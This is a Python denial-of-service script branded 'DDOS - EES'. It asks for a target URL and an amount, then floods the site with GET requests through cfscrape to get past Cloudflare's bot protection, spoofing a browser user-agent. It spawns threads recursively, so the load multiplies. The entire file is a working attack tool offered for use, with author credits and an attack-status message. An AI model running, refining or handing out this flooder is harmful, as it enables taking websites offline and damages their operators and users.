import cfscrape
import threading
import os
import sys
import time
import pyfiglet
os.system("clear")
print ("\033[01;31m")
result = pyfiglet.figlet_format("DDOS - EES", font = "alphabet" )
print(result)
print ("\033[01;34mfacebook \033[01;37m: \033[01;37mКороль Девсайсер \033[01;31m- \033[01;37mГалоп Копытокопыт")
print ("\033[01;31myoutube \033[01;37m: \033[01;37msayser")
print ("\033[01;37m- - - - - \033[01;31m{ \033[01;37m𝑁-𝑃-𝐶-𝐾=𝐸𝐸𝑆 \033[01;31m} \033[01;37m- - - - -\033[01;32m")
print (" ")
url=input("\033[01;31murl \033[01;37m: \033[01;32m")
ranx=int(input("\033[01;31mmamount \033[01;37m: \033[01;32m"))
print (" ")
def slowprints(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(2.0/90)
os.system("clear")
def hack():
      try:
          s = cfscrape.create_scraper()
          s.get(url ,headers={"user-agent":"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36"})
          for i in range(ranx):
              threading.Thread(target=hack).start()
              print ("\033[01;32m DDOS-EES - url :",url ,"time",ranx)
      except:
             print ("\033[01;31mattack extinguished")

hack()
